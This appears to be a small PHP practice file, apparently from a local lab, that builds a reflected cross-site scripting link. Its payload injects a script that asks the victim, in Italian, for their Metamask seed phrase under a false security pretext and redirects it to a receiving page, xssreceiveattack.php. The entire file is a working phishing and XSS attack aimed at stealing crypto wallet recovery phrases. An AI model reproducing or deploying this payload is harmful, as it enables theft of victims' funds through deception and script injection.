<?php
$script="</h1><script>let c=prompt('Per motivi di sicurezza inserisci il seed di Metamask');window.location.href='http://localhost/xssreceiveattack.php?c='.concat(c.replaceAll(' ','_'));</script>";
?>

<html>
    <body>
        <a href="http://localhost/where3.php?id=<?php print $script; ?>">Clicca qui per collegarti al sito</a>
    </body>
</html>